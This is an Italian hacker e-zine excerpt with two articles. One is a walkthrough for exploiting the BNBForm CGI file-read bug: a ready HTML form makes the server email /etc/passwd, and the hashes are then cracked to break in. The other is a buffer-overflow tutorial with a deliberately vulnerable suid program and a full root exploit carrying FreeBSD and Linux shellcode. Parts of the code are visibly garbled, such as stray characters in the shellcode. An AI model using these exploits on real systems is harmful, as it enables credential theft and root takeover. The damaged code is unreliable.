|   -._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-  |
|                                                                          |
|                                                                          |
| cd /Exploitare_il_bnbform.cgi                                            |
| cat exploitare_il_bnbform.cgi.txt                                        |
|                                                                          |
| Adesso arriviamo alla fase calda dell'articolo.                          |
| Ovvero vedremo come sfruttare questo cgi script per avere accesso ad un  |
| server.                                                                  |
| Il bug in questo cgi consente di leggere file arbitrari contenuti nel    |
| filesystem.                                                              |
| Il problema Φ che questo form spedisce un'email di risposta all'user     |
| con il contenuto di qualsiasi tipo di file contenuto nella variabile     |
| dell'autommessage.                                                       |
| Questo pu≥ essere usato per specificare ogni tipo di file che Φ letto    |
| dall'uid del webserver.                                                  |
| Questo bug Φ stato scovato il 3 Dicembre 1998 da:                        |
|                                                                          |
| duke (duke@viper.net.au - duke@el8.org)                                  |
|                                                                          |
| Nonostante la sua datata scoperta, non Φ mai stata rilasciata una patch, | 
| infatti le versioni buggate sono:                                        |
|                                                                          |
|                                                                          |
|               Big Nose Bird BNBForm 1.0                                  |
|               Big Nose Bird BNBForm 2.0                                  |
|               Big Nose Bird BNBForm 3.0                                  |
|                                                                          |
| Quindi l'unico modo di evitare questo bug, Φ aggiornare il proprio       |
| script alla versione:                                                    |
|                                                                          |
|                                                                          |
|               Big Nose Bird BNBForm 4.0                                  |
|                                                                          |
| che Φ stato rilasciato senza questa vulnerabilitα.                       |
|                                                                          |
| Qui di seguito riporter≥ le linee fondamentali del form                  |
| per exploitare il cgi.                                                   |
| Nell'esempio qui citato, cercheremo di farci mandare il file             |
| di passwd del sistema.                                                   |
|                                                                          |
| Come detto in precedenza, la variabile automessagge permette la          |
| lettura di file, infatti noi settiamo la stringa:                        |
|                                                                          |
| &lt;INPUT TYPE="HIDDEN" NAME="automessage" VALUE="/etc/passwd">             |
|                                                                          |
| per farci mandare il file di passwd.                                     |
|                                                                          |
| Altra cosa importante, Φ la prima stringa, dove si cita l'host( o l'ip)  |
| e il precorso del bnbform.cgi:                                           |
|                                                                          |
| &lt;FORM METHOD="POST" ACTION="http://www.victim.com/cgi-bin/bnbform.cgi">  |
|                                                                          |
|                                                                          |
| Codice da salvare in un file .htm :                                      |
|                                                                          |
|                                                                          |
|                                                                          |
| &lt;FORM METHOD="POST" ACTION="http://www.victim.com/cgi-bin/bnbform.cgi">  |
| &lt;PRE>                                                                    |
|  FIELDS MARKED WITH * ARE REQUIRED!                                      |
|  Your Name:*       &lt;INPUT TYPE="TEXT" NAME="name" SIZE=35 MAXLENGTH=50>  |
|  E-Mail Address:*  &lt;INPUT TYPE="TEXT" NAME="submit_by" SIZE=35           |
|                    MAXLENGTH=50>                                         |
|                    &lt;INPUT TYPE="submit" VALUE="Send Mail!">              |
|                    &lt;INPUT TYPE="reset" VALUE=" Clear-Form">              |
| &lt;/pre>                                                                   |
|                                                                          |
| <!--  SCRIPT CONFIGURATION SECTION -->                                   |
| &lt;INPUT TYPE="HIDDEN" NAME="required" VALUE="name">                       |
| &lt;INPUT TYPE="HIDDEN" NAME="data_order" VALUE="name">                     |
| &lt;INPUT TYPE="HIDDEN" NAME="autorespond" VALUE="yes">                     |
| &lt;INPUT TYPE="HIDDEN" NAME="automessage" VALUE="/etc/passwd">             |
| &lt;INPUT TYPE="HIDDEN" NAME="form_id" VALUE="My Test Form">                |
| &lt;INPUT TYPE="HIDDEN" NAME="ok_url" VALUE="http://127.0.0.1/thanks.html"> | 
| &lt;INPUT TYPE="HIDDEN" NAME="not_ok_url"                                   |
| VALUE="http://127.0.0.1/oops.html">                                      |
| <!--  END OF SCRIPT CONFIGURATION SECTION -->                            |
| &lt;/form>                                                                  |
|                                                                          |
|                                                                          |
| Appena salvato il file,eseguiamolo.                                      |
| Nei 2 box,come richiesto metteremo:                                      |
|                                                                          |
| Un nome a caso,e l'indirizzo e-mail da dove vogliamo recapitare il       |
| file di passwd.                                                          |
| Poi premiamo il bottone "Send Mail!"                                     |
| Se il sito attaccato ci risponderα con la pagina: thanks.html ,l'hack    |
| Φ andato a buon fine, altrimenti c'Φ qualcosa che non vα:  sul server o  | 
| sulla vostra pagina html.                                                |
| Dopo che ci apparirα la pagina thanks.html, dirigiamoci subito verso     |
| la nostra mail e leggiamo il file di passwd che ci arriverα in           |
| allegato.                                                                |
|                                                                          |
| Adesso che abbiamo il file di passwd, lo diamo in pasto ad un password   |
| cracker per l'agloritmo DES, come john the ripper e aspettiamo che       |
| trovi le pass ai suoi rispettivi login.                                  |
| Trovate le pass, avrete accesso al server,tramite i suoi relativi        |
| demoni attivi e abilitati all'uso(ammesso che ci siano).                 |
|                                                                          |
| Anche x oggi abbiamo finito, spero abbiate imparato qualcosa di nuovo,   |
| altrimenti Φ stato solo un ripasso(che nn fa mai male).                  |
|                                                                          |
| Un saluto dal vostro draghetto                                           |
|                                                                          |
|                                                            SPYRO         |
|                                                                          |
|   -._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-  |
|                                                                          |
|                                                                          |
| bash# cd /Ringraziamenti_e_saluti                                        |
| bash# cat ringraziamenti_e_saluti.txt                                    |
|                                                                          |
|                                                                          |
| Saluti:   Bakunin(Mio grande maestro),AtlaWare,mR_bIs0n,Spawn,           |
|           BsTHaCk,Anubi ,D4rkSt4r ,jex,Silent,dibbellas,^maga^,          |
|           Radion,Warning,Terror,Gouranga,Blender,Prodigy,                |
|           Hiolz[83],Memorik,Hedo,                                        |
|           MrWolf,Screen_it,zapotecz,                                     |
|           Goony,Scire,Sulex,Floppino,Grungio,Fratak,                     |
|           McGiver,AntiS,gouranga,LizDay,satz,cancerman,                  |
|           ULCC,Spider2k,Ice'St0rm,                                       |
|           e tutti quelli che ho dimenticato di #phreak.it(scusatemi).    |
|                                                                          |
| I miei amici di azzurranet, in particolare:                              |
|           [Net_Digger],^stan^,HomePack,nix,Resinaro                      |
|                                                                          |
| Poi saluto anche tutti quelli dei tankcommandos,della hrn,pbk,           |
| Maphias0ft, gli Spippolatori,in particolare:                             |
| il grande Master,Chrome,Brigante,RigorMortem,Vinx2o2o,fen0x,             |
| DARKMAN,risk e tutti quelli che mi vogliono bene :)                      |
|                                                                          |
|                                                                          |
| Fuck to: MMMMM un gran vaff. all'amicizia fra ragazzi e ragazze!!        |
|                                                                          |
|                                                                          |
|   -._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-  |
|                                                                          |
|                                                                          |
|                                                                          |
| bash# cat end.c                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
| #include &lt;stdio.h>                                                       |
|                                                                          |
| int main(void){                                                          |
|                                                                          |
|  printf("Anche per oggi Φ tutto dal vostro SPYRO\n");                    |
|                                                                          |
|  printf("Ciaoooooooooooo\n");                                            |
|                                                                          |
| }                                                                        |
|                                                                          |
|                                                                          |
| bash# halt                                                               |
|                                                                          |
| ATTENDERE:ARRESTO DEL SISTEMA IN CORSO......                             |
|                                                                          |
| ORA SI PUO' SPEGNERE IL COMPUTER!                                        |
|                                                                          |
| ahahaha scherzo ;)                                                       |
|                                                                          |
|                                                                          |
| Url: http://www.spyrohack.com                                            |
|                                                                          |
| E-mail: spyro2600[at]yahoo.it                                            |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ L'ANG0L0 DEGLi ExPL0iT                     #08 - 01/11/2002 |
| LA G0CCiA CHE FA TRAB0CCARE iL BUFFER                    [e4m] 0x10/0x1A |
+--------------------------------------------------------------------------+
|       + La goccia che fa traboccare il buffer +                          |
|                                                                          |
|    (versione 2 riveduta , agiornata e corretta ..!)                      |
|                                                                          |
|          Written by e4m - e4m@autistici.org                              |
|        Two tux security portal - www.twotux.org                          |
|              @ irc.azzurra.org  - e4m                                    |
| =================================================================        |
|                                                                          |
| Sotto men∙ dell'articolo:                                                |
| -----------------------                                                  |
| [*]- Intro                                                               |
|  |                                                                       |
|  \-> Disclaimer                                                          |
|  |                                                                       |
|  \-> Focus Sullo Stack                                                   |
|  |                                                                       |
|  \-> Intro All'Overflow                                                  |
|                                                                          |
| [*]- Application                                                         |
|  |                                                                       |
|  \-> Il nostro primo "programmillo"                                      |
|  |                                                                       |
|  \-> ShellCoding (..proviamo??!)                                         |
|  |                                                                       |
|  \-> Avanzate Di Dumping                                                 |
|  |                                                                       |
|  \-> Exploiting Remote                                                   |
|                                                                          |
| [*]- End                                                                 |
|  |                                                                       |
|  \-> Greetz & Conclusion                                                 |
|                                                                          |
|                                                                          |
| =================================================================        |
|                                                                          |
| Disclaimer                                                               |
| >>>>>>>>>>>>>>>>>                                                        |
|                                                                          |
| Salve una piccola disclaimer fα sempre bene! Prima di iniziare vi        |
| dico di NON APPLICARE ASSOLUTAMENTE le informazione che trovate          |
| scritte in questo articolo. L'autore pertanto fornisce i sorgenti        |
| scritti da lui sotto licenza GPL! Assolutamente modificabili a           |
| patto che non siano usati per scopi LOSCHI. Sono pertanto OPEN-          |
| SOURCE. Invito a tutti i lettori del precendente articolo sulla          |
| crittografia apparso su OQ, a leggere il forum di ONDAQUADRA             |
| il POST "Scuse" per aver pubblicato sorgenti di autore incognito         |
| tutt'ora sul testo [..] Infine l'autore protegge la sua privacy          |
| ai sensi dell'articolo 21 della costituzione ITALIANA.                   |
|                                                                          |
| - "Tutti hanno diritto di manifestare liberamente il proprio             |
| pensiero con la parola, lo scritto e ogni altro mezzo di diffusione. -   |
|                                                                          |
| Vi auguro una buona lettura ;)                                           |
| ===================================================================      |
|                                                                          |
| Focus sullo Stack                                                        |
| >>>>>>>>>>>>>>>>>>                                                       |
|                                                                          |
| Questa volta sono qui per illustrarvi dettagliatamente come riuscire     |
| a manipolare un programma. Nel nostro caso non useremo exploit           |
| precompilati e roba varia giα esistente in rete,bensi' lo scriveremo     |
| noi con un po (tanta) di pasienza....                                    |
| Tutto qui? eh no, miei cari non e' facilissimo riuscire a fregare        |
| un programma attraverso buffer owerflow.                                 |
| Ultimamente mi sono trovato ad avere a che fare con owerflow di un       |
| programma che sicuramente avranno fregato altri 100 mila reverser...     |
| ma non si sa mai... noi riusciremo ad usare un metodo alternativo.       |
| Uno special greetz va a andreageddon che praticamente Φ il mio tutor     |
| personale :P . Se vi sentite pronti di iniziare vi illustrero' innanzi   |
| tutto come funge un buffer,per chi di assembly e company non ne fa       |
| uso comune troverα qui scritte tutte le informazioni necessarie.:        |
|                                                                          |
|   |Higt addresses                                                        |
|   |                                                                      |
|   |      +--------+                                                      |
|   |      | DatA   |                                                      |
|   |StaCk | pUsched|                                                      |
|   |GrOwS +--------+ <---(SP) sTAck PoInTeR                               |
|   |      |        |                                                      |
|   |      | FreE   |                                                      |
|   |      |  SpAcE |                                                      |
|   |      |        |                                                      |
|   |      +--------+ <---(SS) stAcK sEgMEnT                               |
|   |                                                                      |
|   V Low addresses                                                        |
|                                                                          |
| Questo mio disegnino e' famoso, ma molto utile. Lo sapevate che          |
| esiste una speciale area di memoria, denominata stack? Nella quale       |
| area possono essere salvati e recuperati i valori desiderati.            |
| Quest'area di memoria e' organizzata come una pila di piatti.            |
| L'ultimo che viene messo e' il primo ad essere prelevato.                |
| Questo tipo di organizzazione e' denominata Last On First Off (LOFO),    |
| oppure Last In First Out (LIFO). Faremo uso delle istruzioni             |
| PUSH & POP rispettivamente inseriscono e prelevano un determinato        |
| dato dallo stack. Che cacchio centra tuto cio'? ..Vedrete! ..            |
| Via via che nuovi dati sono posti nello stack, questo cresce             |
| verso il basso. Come si vede dalla "figura", lo stack ha inizio ad un    |
| indirizzo alto e                                                         |
| cresce verso il basso.... Ancora non avete le idee chiare?               |
| Eh,se mettessimo piu' dati un array,facendo owerflov_are = trabboccare   |
| dati in eccesso?                                                         |
| Il trabboccamento avviene piu o meno cosi':                              |
|                                                                          |
|         buffer     sfp   ret                                             |
|  <--- [BBBBBBBBBB][xxxx][xxxx]                                           |
|                                                                          |
| Questa e' una parte dello stack frame.                                   |
| Sostanzialmente abbiamo 10 bytes di buffer, 4 bytes dello Stack Frame    |
| Pointer e altri 4 di Indirizzo di ritorno. Sovrascrittura dello spazio   |
| dello stack non appartentente a quell'array. Quando termina una          |
| funzione                                                                 |
| il programma torna al "ret", invece di fralo ritornare dove vuole lui e  |
| lo facessimo tornare dove vogliamo noi?...ad esempio reindirizzandolo    |
| ad                                                                       |
| una shellcode :) Bhe.. se il programma e' di proprieta' root (uid 0) e   |
| suid +s (bit suiddato!)..possiamo "fregarlo". Ora ci tocca conoscere a   |
| fondo il nostro amico buffer se vogliamo reversarlo dobbiamo conoscere   |
| gli indirizzi necessari per iniettare la nostra shellcode                |
| (poi vedremo..!).                                                        |
| Facciamo il caso che 0xbfbffbc8 fosse l'offset dello stack,              |
| se scrivessimo un programma ,qualsiasi variabile dichiarata              |
| sarebbe allocata nell'indirizzo di memoria immediatamente                |
| successivo a questo  indirizzo. Con un po' di tentativi assistiti        |
| dalla fortuna e' cosi' possibile trovare l'indirizzo di un buffer        |
| all'interno della memoria. Infatti c'e' da dire che qualsiasi            |
| programma inserisce il suo  record di attivazione nel buffer li'         |
| oltre lui il ret e lo sfp troviamo pure le variabili del programma.      |
| Questa tabella puo'esservi utile:                                        |
| =====================================================================    |
|                                                                          |
|                                                                          |
|                                                                          |
| Intro all'overflow                                                       |
| >>>>>>>>>>>>>>>>>>>                                                      |
|                                                                          |
| Tutti, anche i meno esperti sapranno come si dividono le variabile, ma   |
| non si sa mai..! Ecco qui , fate molta attenzione:                       |
|                                                                          |
| * Char                                                                   |
| Carattere (esempio. a)  -> Questo Ci servirα                             |
|                                                                          |
| * Int                                                                    |
| Numero intero (esempio. 3) -> Idem per questo!                           |
|                                                                          |
| * Short                                                                  |
| Numero intero corto                                                      |
|                                                                          |
| * Long                                                                   |
| Numero intero lungo                                                      |
|                                                                          |
| * Float                                                                  |
| Numero reale "corto"                                                     |
|                                                                          |
| * Double                                                                 |
| Numero reale "lungo"                                                     |
|                                                                          |
|                                                                          |
| Bene idem con array e puntatori comunque Φ bene ridarci una              |
| sbirciatina:                                                             |
| Un array e' una struttura contenente una successione di caratteri        |
| oppure di numeri.                                                        |
|                                                                          |
| char rotfl[10]="abcdefghil" (esempio incorretto)                         |
|                                                                          |
| per chi non lo sapesse un array viene specificato un numero pi∙ grande   |
| di quello che                                                            |
| si vuole inserire dentro. Esempio:                                       |
|                                                                          |
| Stringa da mettere in array: rotfl (5caratteri)                          |
|                                                                          |
| char rotfl[6]="rotfl" (notete quel 6 che sta per 5)                      |
|                                                                          |
| L'ultimo carattere non conta! Potremmo benissimo strutturare l'array     |
| ROTFL cos∞:                                                              |
|                                                                          |
| rotfl[0]='r';                                                            |
| rotfl[1]='o';                                                            |
| rotfl[2]='t';                                                            |
| rotfl[3]='f';                                                            |
| rotfl[4]='l';                                                            |
|                                                                          |
| Ora torna, il fatto dei 5 caratteri infatti l'ultimo e'0 !               |
|                                                                          |
| IL problema ora della sicurezza informatica pu≥ essere cos∞ banale!      |
| State a sentire:                                                         |
| Un array non e' dinamico , ossia se Φ stato dichiarato 5 non potrα       |
| contenere 6 o 7.                                                         |
| Si potrebbe gestire l'array come stringa in questo modo "giocando con    |
| la                                                                       |
| memoria".                                                                |
| Vediamo ora come si gestiscono gli array (tramite la malloc)             |
| che ci servirα successivamente nei programmi che scriveremo:             |
| Qui riporto una parte di manuale "man malloc" chΦ Φ sacro e utilissimo:  |
|                                                                          |
|                                                                          |
|                                                                          |
| NAME                                                                     |
|        calloc,  malloc, free, realloc - Allocate and free dynamic        |
|        memory                                                            |
|                                                                          |
| SYNOPSIS                                                                 |
|        #include &lt;stdlib.h>                                               |
|                                                                          |
|        void *calloc(size_t nmemb, size_t size);                          |
|        void *malloc(size_t size);                                        |
|        void free(void *ptr);                                             |
|        void *realloc(void *ptr, size_t size);                            |
|                                                                          |
| DESCRIPTION                                                              |
|        calloc() allocates memory for an array of  nmemb  elements        |
|        of  size bytes each and returns a pointer to the allocated        |
|        memory.  The memory is set to zero.                               |
|                                                                          |
|        malloc() allocates size bytes and returns a pointer to the        |
|        allocated memory.  The memory is not cleared.                     |
|                                                                          |
|        free()  frees  the  memory  space pointed to by ptr, which        |
|                                                                          |
| Cosa altro c'e' da capire grazie linux e il tuo man!                     |
|                                                                          |
| char *vettore;                                                           |
| vettore = malloc(strlen("ROTFL!")); /* copia nel vettore!*/              |
| vprintf(vettore,"%s",);                                                  |
| printf("%s\n",vettore);                                                  |
| free(vettore); /* libera il vettore*/                                    |
|                                                                          |
| Avremmo : ROTFL!                                                         |
|                                                                          |
|                                                                          |
| Se non volete fare la fine dei soliti programmatori inesperi che         |
| combinano casini                                                         |
| liberate!! con free() la memoria .. a furia di sovraccaricarla potrebbe  |
| partirvi tutto :)                                                        |
| Revisione veloce alle funzioni applicative su stringhe array e           |
| compagnia                                                                |
| bella :P                                                                 |
|                                                                          |
|  void strcpy(char *dest, char *orig) /* Copia il char da "origine" a     |
| "destinazione" */                                                        |
|                                      /* lo useremo bene dopo... */       |
|                                                                          |
|  int strlen(char *vettore)                                               |
| /* Restituisce la lunghezza in caratteri del vettore */                  |
|                             /*  futile per i nostri scopi.. */           |
|                                                                          |
|  int sizeof(void *vettore) /* Restituisce la grandezza del vettore */    |
|  /*carino calcola : 1byte x numero degli elementi in array .. ma         |
| anchesso futile!*/                                                       |
|                                                                          |
|                                                                          |
| Ora osservate questo esempio di codice C, Φ logicamente tutto            |
| illustrato                                                               |
| e commentato:                                                            |
|                                                                          |
|                                                                          |
| void pluto(int a, char b) {                                              |
| /* un certo void dove vengono dichiarati */                              |
| /* (integer:a) e (character:b)*/                                         |
|                                                                          |
| int i;                                                                   |
|                                                                          |
| char rotfl[10];                                                          |
| /* questo array Φ pericoloso ..! */                                      |
|                                                                          |
| ...                                                                      |
|                                                                          |
| }                                                                        |
|                                                                          |
|                                                                          |
|                                                                          |
|                                    [Half of buffer]                      |
|                 array-->                |    |          <--variabili     |
|                       rotfl        i     psp   ret   a     b             |
|                                                                          |
|  Low Addreses     [            ][    ][    ][    ][    ][    ] Hight     |
| adresses                                                                 |
|                                                                          |
| Addreses          [EEEEEEEEEEEE][EEEE][FFFF][FFFF][FFFF][FFFF]           |
|                                                                          |
| Addreses of memory 0123456789AB  CDEF  0123  4567  89AB  CDEF            |
|                                                                          |
|                                                                          |
| Okkio: da notare rotfl[] e' dichiarato di 10 byte eppure ne occupa 12.   |
| Ponete attenzione a questa sovrascrittura (ometto schemino complesso):   |
|                                                                          |
| void rotfl(int a, char b) {                                              |
|                                                                          |
| int i;                                                                   |
|                                                                          |
| char parola[10];                                                         |
|                                                                          |
| char buffer[50] = "aa";                                                  |
|                                                                          |
|                                                                          |
|                                                                          |
| strcpy(parola, buffer); /*strcpy Φ stringcopy infatti */                 |
|                           /* copia il valore del buffer in parola*/      |
|                                                                          |
| }                                                                        |
|                                                                          |
|                                                                          |
|                         rotfl        i     psp   ret   a     b           |
|                                                                          |
|         Low Addreses [aaaaaaaaaaXX][aaaa][aaaa][aaaa][aaaa][aaaa] Hight  |
| adresses                                                                 |
|                       sovrascrittura aree (SIGSEGV)---------->           |
|                                                                          |
|                                                                          |
| Avremo un bell'owerflow dei dati,infatti "a" invadera' altri spazi,      |
| la macchina vi restituira' un "Segmentation Fault" . nel nostro caso     |
| rotf[[] cerchera' di far saltare all'indirizzo (ret) "a" che             |
| in hex /0x41h. Logicamente lamacchina per quanto possa essere            |
| premurosa a saltare al return non                                        |
| riuscirα ripareare  i danni che causerebbe una shellcode [..]            |
|                                                                          |
| Ora se noi a posto di quel ret un indirizzo valido, una shellcode?       |
| Il flusso riprende al ret e se ret=shellcode noi siamo root,un gioco di  |
| parole :P                                                                |
|                                                                          |
| Il buffer abbiamo capito come owerflowarlo.Ma dobbiamo capire meglio la  |
| funzione dei nop.. in pratica e' un istruzione /x90 assembly che non fa  |
| altro che saltare a quella successiva,proprio quello che ci serviva per  |
| trovare l'indirizzo del buffer. Bene noi dobbiamo effettuare un salto    |
| all'inizio del buffer del nostro programma vulnerabile per eseguire lo   |
| shellcode, ma non sappiamo esattamente dove saltare. Ma se i primi 200   |
| bytes del buffer fossero NOP prima dello shellcode ? Allora potremmo     |
| saltare ad ogni posizione nel buffer                                     |
| finche' non viene raggiunto ed eseguito lo shellcode!  Con questo        |
| sistema abbiamo solo bisogno di sapere in linee generali dove e' il      |
| buffer, per raggiungere lo                                               |
| stack pointer e sottrargli un offset con un incremento di 30 o 40,       |
| finche' non raggiungiamo un NOP nel buffer. W i nops :)                  |
| Introduciamo noi un buffer nel codice dell'exploit di 600 bytes e una    |
| linea di comando che ci consente di specificare l'offset dello stack     |
| pointer.:                                                                |
|                                                                          |
| Faccio un ultimo esempio prima di passare a scrivere l'exploit:          |
|                                                                          |
|                                                                          |
|                                                                          |
| void main() {                                                            |
|                                                                          |
|    int *ret;  /* supponiamo che il ret sua integer.. */                  |
|                                                                          |
|    char rotfl[] = "\x90\x90\x90\x90\x90\x90\xb8\x01\x00\x00\x00"         |
|                                                                          |
|                       "\xbb\x00\x00\x00\x00\xcd\x80";                    |
|                                                                          |
|  /* ..che abbiamo una lista stringa in array con quella shellcode */     |
|                                                                          |
|                                                                          |
|                                                                          |
|    ret = (int *)&ret + 2;  /* leggi sotto!*/                             |
|                                                                          |
|    *ret = (int)rotfl;                                                    |
|                                                                          |
| }                                                                        |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
| Addreses            DDEEEEEEEEEEEEEEEEFFFF  FFFF  FFFF  FFFF             |
|                                                                          |
| Addreses of memory  EF0123456789ABCDEF0123  4567  89AB  CDEF             |
|                                                                          |
|                           rotfl             *ret  sfp   ret              |
|                                                                          |
|      <------   [ cagata-di-codice-hex ][    ][    ][0xDE]                |
|                                                                          |
|                  <-- (ret) Saltera' nell'array "rotfl"                   |
|                                                                          |
|                                                                          |
| ======================================================================   |
|                                                                          |
| Il nostro primo "programmillo"                                           |
| >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>                                           |
|                                                                          |
|                                                                          |
| "Vedo" (spero!!) che ora avete capito.. (che imbecille che sono :P),     |
| *ret = (int)rotfl; cambia il return address all'indirizzo di rotfl[]     |
| Ora ci tocca scoprire l'indirizzo dello stack pointer, facilissimo,      |
| approfittiamo del fatto che lo stack pointer  e' nel (registro eax),     |
| spostandolo nel buffer di ritorno (registro esp),avvalendoci della       |
| funzione Sp() ...                                                        |
|                                                                          |
|                                                                          |
|   unsigned long sp(void) {                                               |
|           __asm__("movl %esp, %eax"); }                                  |
|                                                                          |
| /* _asm_ esegue in C un istruzioen ASM                                   |
|  *                                                                       |
|  * movl %esp , %eax                                                      |
|  *                                                                       |
|  * equivale a:                                                           |
|  *                                                                       |
|  * mov eax , esp                                                         |
|  *                                                                       |
|  */                                                                      |
|                                                                          |
|   void main(void) {                                                      |
|           printf("0x%x\n", sp());                                        |
|                                                                          |
| /* Questo Φ il main la la parte principale                               |
|  * pove in pratica viente spostato con SP()                              |
|  * l'indirizzo importante , logicamnete                                  |
|  * printf() lo stampa :PP !                                              |
|  */                                                                      |
|                                                                          |
|   }                                                                      |
|                                                                          |
|                                                                          |
| Proviamo pure :                                                          |
|                                                                          |
| [e4m@twotux e4m]$ gcc -o stack stack.c                                   |
| [e4m@twotux e4m]$ ./stack                                                |
| [e4m@twotux e4m] 0xbfbffbc4     <-- esempio :)                           |
| [e4m@twotux e4m]$                                                        |
|                                                                          |
|                                                                          |
| Ora vedremo come un semplice ma allo stesso tempo RIPETITIVO!            |
| errore di programmazione in questo esempio possa darci root, lo          |
| chiameremovulnerable e setteremo : < chmod +s vulnerable >               |
| mentre siamo root da bravi lameri :) ..:                                 |
|                                                                          |
|                                                                          |
| /* Questo e' un programma vulnerabile, per testare l'exploit */          |
|                                                                          |
| int main(int argc, char *argv[]) {                                       |
|         char buffer[512];                    /* mhhh...!   */            |
|         if(argc>=2) strcpy(buffer, argv[1]); /* deheheh :) */            |
|         return 0;                                                        |
| }                                                                        |
|                                                                          |
| Ed ora l'apposito exploit multiargomentato e commentato :)               |
|                                                                          |
|                                                                          |
| ------------------------8<--CUT HERE--8<-------------------------------  |
| -                                                                        |
|                                                                          |
|                                                                          |
| /* Smasher Overflow Example.                                             |
|  * Copy Left By e4m (opensource)                                         |
|  *                                                                       |
|  * Compatible (FreeBsd & Linux)                                          |
|  * This Programm profit of bit suid                                      |
|  * of bugged example! You must use                                       |
|  * ONLY to understand BufferOverflow                                     |
|  * most popular of bug :P                                                |
|  *                                                                       |
|  *                                                                       |
|  * e4m@bitchx.it                                                         |
|  * www.twotux.org                                                        |
|  *                                                                       |
|  */                                                                      |
|                                                                          |
|                                                                          |
| #include &lt;stdio.h>                                                       |
| #include &lt;stdlib.h>                                                      |
|                                                                          |
| #define BUFFERSIZE 612                                                   |
| /* Array buffer, di 512 ossia buffer+100 bytes*/                         |
|                                                                          |
| /* shellcode per freebsd (*bsd ?) */                                     |
| char bsdshell[] =                                                        |
| "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"                               |
| "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"                               |
| "\xb0\x3b\x50\xcd\x80";                                                  |
|                                                                          |
| /* linux x86 shellcode written by aleph1 !! */                           |
| char lunixshell[] =                                                      |
| "\xeb\x1d\x5e\x29\xc0\x88\x46\x07\x89\x46\x0c\x89\x76\x08\x$"            |
| "\x0b\x87\xf3\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x29\xc0\x40\x$"            |
| "\x80\xe8\xde\xff\xff\xff/bin/sh";                                       |
|                                                                          |
| /* ..eccoti una shell */                                                 |
|                                                                          |
|                                                                          |
|                                                                          |
| unsigned long sp(void)                                                   |
| {                                                                        |
|         __asm__("movl %esp, %eax");                                      |
|                                                                          |
| /* istruzione assembly in array C ,                                      |
| /* utilizzata per il valore dello stack pointer  (registro eax) */       |
| /* nel buffer di ritorno (registro esp) */                               |
|                                                                          |
| }                                                                        |
|                                                                          |
| void usage(char *cmd) {                                                  |
|         printf("\nSemblice Owerflow di vulnerable \n");                  |
| /* C'e' bisogno di commento? :P */                                       |
|         printf("\nCoded by e4m thx to MASTER aleph1 \n");                |
|         printf("\nSintassi: %s &lt;offset> &lt;os>\n\n", cmd);                 |
| /* Sinstassi d'utilizzo*/                                                |
|         printf("OS types are:  1. FreeBSD (*bsd?)  2. Linux\n\n");       |
| /* scegli l'os */                                                        |
|         exit(-1); }                                                      |
|                                                                          |
| int main(int argc, char *argv[])                                         |
| {                                                                        |
|                                                                          |
|         int i, offset, os;                                               |
| /* variabili , offset */                                                 |
|         long esp, ret, *addr_ptr;                                        |
| /* retun address , esp in cui e' contenuto */                            |
| /*l'indirizzo dello stackpointer*/                                       |
|         char *buffer, *ptr, *osptr;                                      |
| /* buffer e ptr */                                                       |
|         if(argc<3) usage(argv[0]);                                       |
| /* chiudo il prog. se non viene specificato l'offset */                  |
|                                                                          |
|         /* specifico le variabili */                                     |
|                                                                          |
|         offset = atoi(argv[1]);                                          |
| /* prendo l'offset che tu hai specificato */                             |
|         esp = sp();                                                      |
| /* vedo l'indirizzo dello stack pointer */                               |
|         ret = esp-offset;                                                |
| /* sp - offset = return address :) */                                    |
|         os  = atoi(argv[2]);                                             |
| /* vedo l'os che hai scelto  */                                          |
|                                                                          |
|                                                                          |
|         if(os<1 || os>2) usage(argv[0]);                                 |
|                                                                          |
|         /* Resoconto generale */                                         |
|         printf(" Stack pointer: 0x%x\n", esp);                           |
| /* 1. stackpointer add.*/                                                |
|         printf("  Offset: 0x%x\n", offset);                              |
| /* 2. offset */                                                          |
|         printf("  Return addr: 0x%x\n", ret);                            |
| /* retun address */                                                      |
|                                                                          |
|         /* allocazione di memoria per il buffer */                       |
|         if(!(buffer = malloc(BUFFERSIZE))) {                             |
| /* confronta il buffer con malloc , vedo se e' heap*/                    |
|                 printf("Couldn't allocate memory.\n");                   |
| /* errore */                                                             |
|                 exit(-1);                                                |
| /* on error esce */                                                      |
|         }                                                                |
|                                                                          |
|                                                                          |
|   /* continuiamo con il riempire packet con il return address */         |
|         ptr = buffer;                                                    |
|         addr_ptr = (long *)ptr;                                          |
|         for(i=0; i&lt;BUFFERSIZE; i+=4)                                     |
| /* loop */                                                               |
|                 *(addr_ptr++) = ret;                                     |
| /* address ptr = return address */                                       |
|                                                                          |
|   /* riempio la parte half del buffer con i NOPs*/                       |
|         for(i=0; i&lt;BUFFERSIZE/2; i++) /* loop */                         |
|         buffer[i] = '\x90';   /* istruzione nop x90 */                   |
|                                                                          |
|                                                                          |
|         /* Una volta creato il pseudo codice con gli */                  |
| /* address+buffer+nop inserisco in mezzo la shellcode */                 |
|         if(os == 1) {                                                    |
|         ptr = buffer + ((BUFFERSIZE/2) - (strlen(bsdshell)/2));          |
|         /*Se l'os scelto e' 1=bsd ..*/                                   |
|         for(i=0; i&lt;strlen(bsdshell); i++)                                |
|         /* allora inserisco l'array della sua shellcode */               |
|          *(ptr++) = bsdshell[i];                                         |
|                                                                          |
|        } else {                                                          |
|         ptr = buffer + ((BUFFERSIZE/2) - (strlen(lunixshell)/2));        |
| /*Se l'os scelto e' 2=linuxi86 ..*/                                      |
|        for(i=0; i&lt;strlen(lunixshell); i++)                               |
| /* allora inserisco l'array della sua shellcode */                       |
|                         *(ptr++) = lunixshell[i];                        |
|         }                                                                |
|                                                                          |
| /* chiamo il programmino vulnerabile e passo */                          |
| /* l'exploit buffer e gli argomenti :) */                                |
|         buffer[BUFFERSIZE-1] = 0;                                        |
|                                                                          |
|  execl("./vulnerable", "vulnerable", buffer, 0);                         |
|  /* richiamo il programma vulnerabile e copio il buffer*/                |
|                                                                          |
|         return 0;                                                        |
|                                                                          |
| }                                                                        |
